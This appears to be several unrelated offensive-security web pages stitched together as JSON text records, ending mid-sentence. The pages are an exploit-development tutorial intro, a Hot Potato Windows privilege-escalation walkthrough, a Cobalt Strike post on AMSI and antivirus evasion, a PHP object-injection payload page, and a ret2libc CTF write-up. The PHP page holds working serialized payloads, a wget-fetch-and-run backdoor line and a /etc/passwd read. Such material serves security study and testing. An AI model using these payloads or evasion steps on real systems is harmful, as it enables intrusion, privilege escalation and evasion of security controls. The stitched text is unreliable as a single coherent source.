from\n\u201cSaved Return Pointer Overflows\u201d to \u201cROP (Return Oriented Programming)\u201d\nof course these tutorials won't write themselves so it will take some\ntime to get there. It is worth mentioning that these tutorials wont\ncover all the small details and eventualities; this is done by design\nto (1) save me some time and (2) allow the diligent reader to learn by\nparticipating.\nI would like to give special thanks to Offensive Security and Corelan,\nthanks for giving me this amazing and painful addiction!!\n(1) What we need\nImmunity Debugger - [12]Download\nImmunity Debugger is similar to Ollydbg but it has python support which\nwe will need to run plugin\u2019s to aid us with our exploit development.\nIt\u2019s free; on the link just fill in some bogus info and hit download.\nMona.py - [13]Download\nMona is an amazing tool with tons of features which will help us to do\nrapid and reliable exploit development. I won\u2019t be discussing all the\noptions here, we\u2019ll get to them during the following parts of the\ntutorial. Download it and put it in Immunity\u2019s PyCommands folder.\nPvefindaddr.py - [14]Download\nPvefindaddr is Mona\u2019s predecessor. I know it\u2019s a bit outdated but it\u2019s\nstill useful since there are some features that haven\u2019t been ported to\nMona yet. Download it and put it in Immunity\u2019s PyCommands folder.\nMetasploit Framework - [15]Download\nWe are going to use the Metasploit Framework extensively. Most of all\nwe are going to be generating shellcode for our exploits but we are\nalso going to need a platform that can receive any connections we might\nget back from the programs we are exploiting. I suggest you use\nBacktrack since it has everything we need but feel free to set up\nmetasploit in any way you see fit.\nVirtualization Software\nBasically there are two options here VirtualBox which is free and\nVmware which isn't. If its possible I would suggest using Vmware; a\nclever person might not need to pay for it ;)). Coupled with this we\nwill need several (32-bit) operating systems to develop our exploits on\n(you will get the most use out of WindowsXP PRO SP3 and any Windows7).\n(2) Overflows\nFor the purpose of these tutorials I think it\u2019s important to keep\nthings as simple or difficult as they need to be. In general when we\nwrite an exploit we need to find an overflow in a program. Commonly\nthese bugs will be either Buffer Overflows (a memory location receives\nmore data than it was meant to) or Stack Overflows (usually a Buffer\nOverflow that writes beyond the end of the stack). When such an\noverflow occurs there are two things we are looking for; (1) our buffer\nneeds to overwrite EIP (Current Instruction Pointer) and (2) one of the\nCPU registers needs to contain our buffer. You can see a list of x86\nCPU registers below with their separate functions. All we need to\nremember is that any of these registers can store our buffer (and\nshellcode).\nEAX - Main register used in arithmetic calculations. Also known as accumulator,\nas it holds results\nof arithmetic operations and function return values.\nEBX - The Base Register. Pointer to data in the DS segment.  Used to store the b\nase address of the\nprogram.\nECX - The Counter register is often used to hold a value representing the number\nof times a process\nis to be repeated. Used for loop and string operations.\nEDX - A general purpose registers. Also used for I\/O operations. Helps extend EA\nX to 64-bits.\nESI - Source Index register. Pointer to data in the segment pointed to by the DS\nregister.  Used as\nan offset address in string and array operations. It holds the address fro\nm where to read data.\nEDI - Destination Index register. Pointer to data (or destination) in the segmen\nt pointed to by the\nES register.  Used as an offset address in string and array operations. It\nholds the implied\nwrite address of all string operations.\nEBP - Base Pointer. Pointer to data on the stack (in the SS segment).  It points\nto the bottom of the\ncurrent stack frame. It is used to reference local variables.\nESP - Stack Pointer (in the SS segment). It points to the top of the current sta\nck frame. It is used\nto reference local variables.\nEIP - Instruction Pointer (holds the address of the next instruction to be execu\nted)\n(3) How does it work?\nBasically (1) we get a program to store an overly long string, (2) this\nstring overwrites EIP and part of it is stored in a CPU register, (3)\nwe find a pointer that points to the register that contains our buffer,\n(4) we put that pointer in the correct place in our buffer so it\noverwrites EIP, (5) when the program reaches our pointer it executes\nthe instruction and jumps to the register that contains our buffer and\nfinally (6) we place our shellcode in the part of the buffer that is\nstored in the CPU register. In essence we hijack the execution flow and\npoint it to an area of memory that we control. If we are able to do\nthat we can have to remote machine execute any instructions we place\nthere. This is a bit simplistic but it should give you a basic idea of\nhow exploits work.\n\u00a9 Copyright [16]FuzzySecurity\n[17]Home | [18]Tutorials | [19]Scripting | [20]Exploits | [21]Links |\n[22]Contact"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Hot Potato Comments Feed\n[4]alternate [5]alternate [6]Penetration Testing Lab [7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]April 13, 2017\nHot Potato\nby [28]Administrator.In [29]Privilege Escalation.[30]2 Comments on Hot\nPotato\nHot potato is the code name of a Windows privilege escalation technique\nthat was discovered by Stephen Breen. This technique is actually a\ncombination of two known windows issues  like NBNS spoofing and NTLM\nrelay with the implementation of a fake WPAD proxy server which is\nrunning locally on the target host.\nNTLM authentication via the same protocol like SMB has been already\npatched by Microsoft however this technique is using HTTP to SMB\nauthentication in order to create a high privilege service as the HTTP\nrequest might come from a high privilege service like the Windows\nupdate. Since the traffic contains the NTLM credentials and is passing\nthrough a fake proxy server it can be captured and passed to a local\nSMB listener to create an elevated service which can execute any\ncommand  as SYSTEM.\n[31]Stephen Breen described all the stages of this attack in his\n[32]blog.\nThis issue affects various windows versions like:\n* Windows 7\n* Windows 8\n* Windows 10\n* Windows Server 2008\n* Windows Server 2012\nAuthenticated User\nStephen Breen has developed a [33]binary which can automate\nthese attacks and can execute any command on the target system with\nelevated privileges. As an authenticated user (pentestlab) it is worth\nchecking first which are the local administrators on the machine.\nVerification of Local Administrators Verification of Local\nAdministrators\nOnce the Potato exploit with the associated DLL\u2019s is dropped on the\nsystem from the command prompt the following can be executed in order\nto start NBNS spoofing locally on 127.0.0.1.\nPotato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true\nHot Potato - Execution of Exploit Hot Potato \u2013 Execution of Exploit\nFrom the moment that HTTP traffic is generated through a configured\nInternet explorer (for example to use corporate proxy settings) the\nattack will be deployed and the CMD command will be executed with\nhigher privileges.\nHot Potato - Attack Deployment Hot Potato \u2013 Attack DeploymentHot Potato\n- Attack Deployment 2 Hot Potato \u2013 Attack Deployment 2\nIn this example the pentestlab user was added to the local\nadministrators group which means that elevation was possible.\nHot Potato - pentestlab user added to local admins pentestlab user\nadded as local admin\nMetasploit\nIt is also possible to use Metasploit Framework in order to get a\nMeterpreter session as SYSTEM instead of adding a new user to local\nadministrators group. This can be achieved with the use of an\nadditional Metasploit payload that should be dropped on the target\nexcept of the Hot Potato exploit and through multiple\nMetasploit handlers.\nThe only thing that needs to be modified in the Hot Potato\nparameters is the command that needs to be executed. Instead of adding\nthe pentestlab user to the local administrators group the\npentestlab3.exe which is a Metasploit payload created by msfvenom will\nbe executed.\nBefore anything else a second shell should be opened on the same host\nso at the same time the Handler module from Metasploit should be used\nin order to receive the connection.\nMetasploit - Executing the Payload Metasploit \u2013 Executing the\nPayloadMetasploit Multi Handler - Meterpreter Metasploit Multi Handler\n\u2013 2nd Meterpreter Session\nThe second shell is necessary as it will be used to initiate HTTP\ntraffic which Hot Potato is needed avoiding the waiting time until the\nnext Windows update which it has been described in various sources on\nthe web related to this privilege escalation method.\nFrom the first shell the Potato exploit will be modified slightly in\norder to run the payload.\nHot Potato and Metasploit Payload Hot Potato and Metasploit Payload\nOn the second shell the Internet Explorer should be initiated so the\nexploit can capture the HTTP traffic.\nInitiate Internet Explorer via CMD Initiate Internet Explorer via CMD\nThis would cause the chain of attacks that Hot Potato uses like NBNS\nspoofing and NTLM relay through different protocols (HTTP to SMB) to\ncreate a new system service that will execute the pentestlab3 payload.\nHot Potato Triggered via Shell Hot Potato TriggeredHot Potato Privilege\nEscalation Hot Potato Privilege Escalation\nA third Metasploit handler should be used to capture the payload that\nit has been executed with higher privileges.\nHot Potato - Capturing the Payload Hot Potato \u2013 Capturing the\nMetasploit Payload\nPowerShell\nThere is an alternative option which simulates the Hot Potato exploit\nin PowerShell and is called [34]Tater. This script is included in\nEmpire, P0wnedShell and PS>Attack and it has two methods to perform\nprivilege escalation.\n1. NBNS WPAD Bruteforce + Windows Defender Signature Updates\n2. WebClient Service + Scheduled Task\nThis script has been tested in Windows 2008 Server R2 environments\nhowever it doesn\u2019t seem to work reliably as in Windows 7 and Windows\n10. Therefore the screenshot below is from the owner of this tool and\nnot from Pentestlab but it is used for a quick reference of Hot Potato\nattack in Powershell.\nHot Potato - PowerShell Hot Potato \u2013 PowerShell\nResources\n[35]https:\/\/github.com\/foxglovesec\/Potato\n[36]Hot Potato \u2013 Windows Privilege Escalation\n[37]https:\/\/github.com\/Kevin-Robertson\/Tater\nRate this:\nShare this:\n* [38]Twitter\n* [39]Facebook\n* [40]LinkedIn\n* [41]Reddit\n* [42]Tumblr\n* [43]WhatsApp\n* [44]Telegram\n* [45]Pinterest\n* [46]Pocket\n* [47]Email\n*\nLike Loading...\nRelated\n[48]Hot Potato[49]Metasploit[50]PowerShell[51]Privilege\nEscalation[52]Tater[53]Windows\n2 Comments\n1. Pingback: [54]Privilege Escalation via Hot Potato \u2013 CTS 4 NG\n2. Pingback: [55]Windows Privilege Escalation Cheatsheet: From User to\nAdmin in Comprehensive Guide \u2013 Codelivly\nLeave a Reply [56]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[57]Previous Previous post: Secondary Logon Handle\n[58]Next Next post: Stored Credentials\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [59]Persistence \u2013 Event Log\n* [60]Initial Access \u2013 search-ms URI Handler\n* [61]Persistence \u2013 Scheduled Task Tampering\n* [62]Persistence \u2013 Windows Telemetry\n* [63]Persistence \u2013 Service Control Manager\nCategories\n* [64]Coding (10)\n* [65]Exploitation Techniques (19)\n* [66]External Submissions (3)\n* [67]General Lab Notes (22)\n* [68]Information Gathering (12)\n* [69]Infrastructure (2)\n* [70]Maintaining Access (4)\n* [71]Mobile Pentesting (7)\n* [72]Network Mapping (1)\n* [73]Post Exploitation (13)\n* [74]Red Team (123)\n+ [75]Credential Access (3)\n+ [76]Defense Evasion (22)\n+ [77]Domain Escalation (5)\n+ [78]Domain Persistence (4)\n+ [79]Initial Access (1)\n+ [80]Lateral Movement (2)\n+ [81]Man-in-the-middle (1)\n+ [82]Persistence (34)\n+ [83]Privilege Escalation (17)\n* [84]Reviews (1)\n* [85]Social Engineering (11)\n* [86]Tools (7)\n* [87]VoIP (4)\n* [88]Web Application (14)\n* [89]Wireless (2)\nPentest Laboratories Discord\n* [90]Discord\nPen Test Lab Stats\n* 7,183,938 hits\n[91]Facebook Page\n[92]Facebook Page\n__________________________________________________________________\n[93]Blog at WordPress.com.\n* [94]Methodologies\n+ [95]Red Teaming\no [96]Persistence\n* [97]Resources\n+ [98]Papers\no [99]Web Application\n+ [100]Presentations\no [101]Defcon\no [102]DerbyCon\no [103]Tools\n+ [104]Videos\no [105]BSides\no [106]Defcon\no [107]DerbyCon\no [108]Hack In Paris\n* [109]Contact\n+ [110]About Us\n* [111]Comment\n* [112]Reblog\n* [113]Subscribe [114]Subscribed\n+ [115]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [116]Log in now.\n*\n+ [117]Penetration Testing Lab\n+ [118]Customize\n+ [119]Subscribe [120]Subscribed\n+ [121]Sign up\n+ [122]Log in\n+ [123]Copy shortlink\n+ [124]Report this content\n+ [125]View post in Reader\n+ [126]Manage subscriptions\n+ [127]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [128]likes-master\n%d"}
{"text":"[1]John Doe\nOffensive Defence\n\"The hand which strikes also blocks.\"\nMaking AMSI Jump\n[2]Rasta Mouse\nJun 16, 2020\n5 min read\nSince 3.13, Cobalt Strike has had a Malleable C2 option called\namsi_disable. This directive tells Beacon to patch the AmsiScanBuffer\nfunction in the host process prior to injecting post-ex capabilities\nsuch as powerpick and execute-assembly. This limits AMSI\u2019s visibility\nof said process and (hopefully) prevents the PowerShell \/ .NET\nassemblies being executed from being scanned.\nOne set of workflows that amsi_disable does not apply to, are the new\n(as of 4.0) jump commands.\nbeacon> help jump\nUse: jump [exploit] [target] [listener]\nAttempt to spawn a session on a remote target with the specified exploit.\nType jump by itself to see a list of available remote exploits.\nbeacon> jump\nBeacon Remote Exploits\n======================\nExploit                   Arch  Description\n-------                   ----  -----------\npsexec                    x86   Use a service to run a Service EXE artifact\npsexec64                  x64   Use a service to run a Service EXE artifact\npsexec_psh                x86   Use a service to run a PowerShell one-liner\nwinrm                     x86   Run a PowerShell script via WinRM\nwinrm64                   x64   Run a PowerShell script via WinRM\npsexec_psh, winrm and winrm64 all use PowerShell and will be the\nsubject of this post.\nWhen lateral movement via winrm \/ winrm64 is blocked by AMSI, the\noutput very helpfully lets us know that\u2019s what\u2019s happening.\nwinrm64-blocked\npsexec_psh is understandably less helpful. We see a service has been\ncreated and started, but we can\u2019t connect to the target.\npsexec_psh-blocked\nResource Kit & AMSITrigger\nThe default PowerShell templates used to generate these payloads can be\noverridden using the [3]Resource Kit. Within this package, we have\nresources.cna, template.x86.ps1, template.x64.ps1 and compress.ps1.\nWithin these templates, there are lines such as\n[Byte[]]$var_code = [System.Convert]::FromBase64String('%%DATA%%')\nwhere %%DATA%% is simply a placeholder for the actual Beacon payload.\nFirst off, we can use a tool such as [4]AMSITrigger to see if any\ndetections are triggered from the templates themselves.\nD:\\Tools\\AMSITrigger\\AMSITrigger\\bin\\Debug>AmsiTrigger.exe -i D:\\Tools\\cobaltstr\nike\\resourcekit\\template.x64.ps1 -f 2\n[23]    \"If ([IntPtr]::size -eq 8) {\n[Byte[]]$var_code = [System.Convert]::FromBase64String('%%DATA%%')\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n$var_code[$x] = $var_code[$x] -bxor 35\n}\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFuncti\nonPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_\ntype @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0\nx40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer\n, $var_code.length)\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFun\nctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero\"\nThe general methodology here is to make modifications to the code being\nhighlighted as malicious and re-scanning with AMSITrigger. I was able\nto circumvent by simply adding else { return } to the end of the If\n([IntPtr]::size -eq 8) block \u00af\\_(\u30c4)_\/\u00af.\nNow if we load resources.cna into the Cobalt Strike Script Manager, and\ntry jump winrm64 again\u2026\nbeacon> jump winrm64 WIN-CJ8120QPH84 tcp\n[*] Tasked beacon to run windows\/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH\n84 via WinRM\n[+] host called home, sent: 219563 bytes\n[+] established link to child beacon: 192.168.152.128\nRepeat the same process with template.x86.ps1 and we can have jump\nwinrm working as well.\nbeacon> jump winrm WIN-CJ8120QPH84 tcp\n[*] Tasked beacon to run windows\/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH\n84 via WinRM\n[+] host called home, sent: 195283 bytes\n[+] established link to child beacon: 192.168.152.128\nThe Compression Problem\nEven though psexec_psh also uses template.x86.ps1, it was still\nfailing. By enabling PowerShell Transcript logging on the test target,\nI was able to see what was happening.\nWindows PowerShell transcript start\nStart time: 20200616135045\nUsername: TESTLAB\\SYSTEM\nRunAs User: TESTLAB\\SYSTEM\nMachine: WIN-CJ8120QPH84 (Microsoft Windows NT 10.0.14393.0)\nHost Application: powershell -nop -w hidden -enc JABz[...snip...]ADsA\n**********************\nPS>$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"H4sI[...snip...]C\nwAA\"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[\nIO.Compression.CompressionMode]::Decompress))).ReadToEnd();\nAt line:1 char:1\n+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"H4sIAAAAA ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus so\nftware.\nAt line:1 char:1\n+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"H4sIAAAAA ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus\nsoftware.\n+ CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordEx\nception\n+ FullyQualifiedErrorId : ScriptContainedMaliciousContent\nIt seems that AMSI has a real issue with base64 decoding and\ndecompressing a GZIP compressed binary - regardless of the actual\nbinary itself. We can verify this by using cmd.exe as a test candidate.\nPS > $cmdBytes = [System.IO.File]::ReadAllBytes(\"C:\\Windows\\System32\\cmd.exe\")\nPS > [System.IO.MemoryStream] $ms = New-Object System.IO.MemoryStream\nPS > $gs = New-Object System.IO.Compression.GzipStream $ms, ([IO.Compression.Com\npressionMode]::Compress)\nPS > $gs.Write($cmdBytes, 0, $cmdBytes.Length)\nPS > $gs.Close(); $ms.Close()\nPS > [System.Convert]::ToBase64String($ms.ToArray()) | clip\nNow if we try to decode and decompress\u2026\nPS C:\\Users\\Daniel> $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"\nH4sI[...snip...]AA==\"));IEX (New-Object IO.StreamReader(New-Object IO.Compressio\nn.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\nAt line:1 char:1\n+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"H4sIAAAAA ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus so\nftware.\n+ CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordExce\nption\n+ FullyQualifiedErrorId : ScriptContainedMaliciousContent\nMy first thoughts for trying to get around this was to modify\ncompress.ps1 and transform the data in a different way or find a\ndifferent compression method. Whilst experimenting, I actually made\nsyntactic error near the top of the script and saw PowerShell errors\nbeing spat out in the transcript log, prior to the actual AMSI error\nbeing thrown.\n**********************\nPS>CommandInvocation(Out-String): \"Out-String\"\n>> ParameterBinding(Out-String): name=\"InputObject\"; value=\"The term 'some-garba\nge' is not recognized as the name of a cmdlet, function, script file, or operabl\ne program. Check the spelling of the name, or if a path was included, verify tha\nt the path is correct and try again.\"\nsome-garbage : The term 'some-garbage' is not recognized as the name of a cmdlet\n, function, script file, or operable\nprogram. Check the spelling of the name, or if a path was included, verify that\nthe path is correct and try again.\nAt line:1 char:1\n+ some-garbage;\nThis showed that I have code execution prior to the Beacon payload\nbeing decoded, so I placed a custom version of my [5]old AMSI bypass at\nthe very top of compress.ps1 which seemed to do the trick.\nbeacon> jump psexec_psh WIN-CJ8120QPH84 tcp\n[*] Tasked beacon to run windows\/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH\n84 via Service Control Manager (PSH)\n[+] host called home, sent: 210319 bytes\n[+] received output:\nStarted service f718f3b on WIN-CJ8120QPH84\n[+] established link to child beacon: 192.168.152.128\nConclusion\nThe flexibility provided by the Resource Kit allows you to transform\nCobalt Strike\u2019s artifacts in practically anyway you may choose and it\njust goes to show how little effort you sometimes have to put in to\nachieve quite decent results."}
{"text":"# PHP Object injection\n\nPHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.\n\nThe following magic methods will help you for a PHP Object injection\n\n* __wakeup() when an object is unserialized.\n* __destruct() when an object is deleted.\n* __toString() when an object is converted to a string.\n\nAlso you should check the `Wrapper Phar:\/\/` in [File Inclusion - Path Traversal](https:\/\/github.com\/swisskyrepo\/PayloadsAllTheThings\/tree\/master\/File%20Inclusion%20-%20Path%20Traversal#wrapper-phar) which use a PHP object injection.\n\n## __wakeup in the unserialize function\n\nVulnerable code:\n\n```php\n<?php \n    class PHPObjectInjection{\n        public $inject;\n        function __construct(){\n        }\n        function __wakeup(){\n            if(isset($this->inject)){\n                eval($this->inject);\n            }\n        }\n    }\n    if(isset($_REQUEST['r'])){  \n        $var1=unserialize($_REQUEST['r']);\n        if(is_array($var1)){\n            echo \"<br\/>\".$var1[0].\" - \".$var1[1];\n        }\n    }\n    else{\n        echo \"\"; # nothing happens here\n    }\n?>\n```\n\nPayload:\n\n```php\n# Basic serialized data\na:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}\n\n# Command execution\nstring(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"\n```\n\n## Authentication bypass\n\n### Type juggling\n\nVulnerable code:\n\n```php\n<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}\n```\n\nPayload:\n\n```php\na:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}\n```\n\nBecause `true == \"str\"` is true.\n\n### Object reference\n\nVulnerable code:\n\n```php\n<?php\nclass Object\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>\n```\n\nPayload:\n\n```php\nO:6:\"Object\":2:{s:10:\"secretCode\";N;s:4:\"code\";R:2;}\n```\n\n## Others exploits\n\nReverse Shell\n\n```php\nclass PHPObjectInjection\n{\n    \/\/ CHANGE URL\/FILENAME TO MATCH YOUR SETUP\n    public $inject = \"system('wget http:\/\/URL\/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');\";\n}\n\necho urlencode(serialize(new PHPObjectInjection));\n```\n\nBasic detection\n\n```php\nclass PHPObjectInjection\n{\n    \/\/ CHANGE URL\/FILENAME TO MATCH YOUR SETUP\n    public $inject = \"system('cat \/etc\/passwd');\";\n}\n\necho urlencode(serialize(new PHPObjectInjection));\n\/\/O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%22system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%22%3B%7D\n\/\/'O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:26:\"system(\\'cat+\/etc\/passwd\\');\";}'\n```\n\n## Finding and using gadgets\n\n[PHPGGC](https:\/\/github.com\/ambionics\/phpggc) is a tool built to generate the payload based on several frameworks:\n\n- Laravel\n- Symfony\n- SwiftMailer\n- Monolog\n- SlimPHP\n- Doctrine\n- Guzzle\n\n```powershell\nphpggc monolog\/rce1 'phpinfo();' -s\n```\n\n## Real world examples\n\n* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https:\/\/hackerone.com\/reports\/410237)\n* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https:\/\/hackerone.com\/reports\/410212)\n* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https:\/\/hackerone.com\/reports\/410882)\n* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https:\/\/hackerone.com\/reports\/407552)\n\n## References\n\n* [PHP Object Injection - OWASP](https:\/\/www.owasp.org\/index.php\/PHP_Object_Injection)\n* [PHP Object Injection - Thin Ba Shane](http:\/\/location-href.com\/php-object-injection\/)\n* [PHP unserialize](http:\/\/php.net\/manual\/en\/function.unserialize.php)\n* [PHP Generic Gadget - ambionics security](https:\/\/www.ambionics.io\/blog\/php-generic-gadget-chains)\n* [POC2009 Shocking News in PHP Exploitation](https:\/\/www.owasp.org\/images\/f\/f6\/POC2009-ShockingNewsInPHPExploitation.pdf)\n* [PHP Internals Book - Serialization](http:\/\/www.phpinternalsbook.com\/classes_objects\/serialization.html)\n* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https:\/\/rawsec.ml\/en\/MeePwn-2017-write-ups\/#tsulott-web)"}
{"text":"#[1]Nandy Narwhals CTF Team \u258c Feed\n[2]Nandy Narwhals CTF Team \u258c\n* [3]About\n* [4]CTF Writeups\n* [5]Tutorials\n* [6]Vulnerability Research\n(BUTTON)\nBypassing ASLR\/NX with Ret2Libc and Named Pipes\nThis writeup describes my solution to an assignment for school\nrequiring us to exploit a classic buffer overflow to gain a shell using\nreturn-to-libc techniques. A technique using named pipes is presented.\nPhoto credit: Life is Strange Stills by Me\namon (j. heng)\namon (j. heng)\nThe Potatosploiter. Pirate of the Seven Proxseas.\n(BUTTON) Follow\n* Singapore\n* [7]Website\n* Email\n* [8]Keybase\n* [9]Twitter\n* [10]GitHub\n* [11]Gitlab\n* [12]YouTube\nReturn-to-Libc and Named Pipes\n* [13]Vulnerable Program\n* [14]Environment and Tools\n+ [15]1. Install Ubuntu 14.04 x86\n+ [16]2. Install Python and Pwntools\n* [17]Description of the Vulnerability\n+ [18]Stack Diagrams\n* [19]Task 1\n+ [20]Blocking Stream Mechanism\n+ [21]Leaking Libc Base\n+ [22]Second Stage Payload\n+ [23]Final Exploit\n* [24]Task 2\n+ [25]Libc Address Leak\n+ [26]Pop Ret ROP Gadgets\n+ [27]Setting the User ID\n+ [28]Reading Bash String into Memory\n+ [29]Calling System\n+ [30]Final Exploit\n* [31]Task 3\n+ [32]Address Space Layout Randomisation\n+ [33]Stack Canaries\nThis writeup describes my solution to an assignment for school\nrequiring us to exploit a classic buffer overflow to gain a shell using\nreturn-to-libc techniques.\nThe original brief allowed for Address Space Layout Randomisation\n(ASLR) to be turned off but I decided to attempt the challenge of\nbypassing ASLR. I present a technique using named pipes to ensure\nbetter reliability of the exploit.\nVulnerable Program\nWe were given the following vulnerable program. Notice that the input\ncomes from reading a file then triggering the bug instead of reading\nfrom a stream like STDIN. This mounts a few issues with the lack of\nblocking for user input since bypassing ASLR requires a leak before\nsupplying calculated libc addresses in a stage two payload.\nOne option is to leverage a race condition to write the calculated\naddresses to the file before it is read a second time but this is not\nreliable and requires multiple attempts for the exploit to work. In the\nfollowing sections, a technique using named pipe is explained.\n\/* retlib.c *\/\n\/* This program has a buffer overflow vulnerability. *\/\n\/* Our task is to exploit this vulnerability *\/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nunsigned int xormask = 0xBE;\nint i, length;\nint bof(FILE *badfile)\n{\nchar buffer[12];\n\/* The following statement has a buffer overflow problem *\/\nlength = fread(buffer, sizeof(char), 52, badfile);\n\/* XOR the buffer with a bit mask *\/\nfor (i=0; i<length; i++) {\nbuffer[i] ^= xormask;\n}\nreturn 1;\n}\nint main(int argc, char **argv)\n{\nFILE *badfile;\nbadfile = fopen(\"badfile\", \"r\");\nbof(badfile);\nprintf(\"Returned Properly\\n\");\nfclose(badfile);\nreturn 1;\n}\nEnvironment and Tools\n1. Install Ubuntu 14.04 x86\nIn this assignment, Ubuntu 14.04 x86 is used with vagrant.\n$ vagrant init ubuntu\/trusty32\n$ vagrant up\n2. Install Python and Pwntools\nThe exploit will be written in python using the pwntools framework.\nPwntools is a framework for exploit development and enables rapid\nprototyping as well as debugging. Additionally, ropper, a tool to\nsearch for ROP gadgets within a given binary is installed.\n$ sudo apt-get update\n$ sudo apt-get upgrade\n$ sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev\nbuild-essential\n$ sudo pip install --upgrade pip\n$ sudo pip install --upgrade pwntools\n$ sudo pip install --upgrade ropper\nDescription of the Vulnerability\nIn this brief section, the vulnerability is explained and the very bare\nminimum is demonstrated to obtain instruction pointer control to lay\nthe foundation for the other two sections.\nThe vulnerable function is listed as:\nint bof(FILE *badfile)\n{\nchar buffer[12];\n\/* The following statement has a buffer overflow problem *\/\nlength = fread(buffer, sizeof(char), 52, badfile);\n\/* XOR the buffer with a bit mask *\/\nfor (i=0; i<length; i++) {\nbuffer[i] \u02c6= xormask;\n}\nreturn 1;\n}\nUser input is read from the open file handle passed in the arguments\ninto the char * buffer. Since 52 bytes are read from the file into a\nbuffer of size 12, a classic stack overflow occurs. The payload has to\nbe encoded as an exclusive-or (XOR) of every byte against 0xbe, the xor\nmask.\ngef\u27a4  r\nStarting program: \/vagrant\/assignment1\/retlib\nProgram received signal SIGSEGV, Segmentation fault.\n0x61616167 in ?? ()\ngef\u27a4  pattern search 0x61616167\n[+] Searching '0x61616167'\n[+] Found at offset 24 (little-endian search) likely\n[+] Found at offset 21 (big-endian search)\ngef\u27a4\nSince the offset in which the EIP control occurs is at 24, the amount\nof space that can be used for the ROP chain is (52 - 24)\/8 which is 7\nvalues on a 32 bit operating system.\nStack Diagrams\nBefore calling the vulnerable function bof, the caller main pushes the\nFILE * badfile argument onto the stack. Next, when the bof function is\ncalled into, the return address is pushed 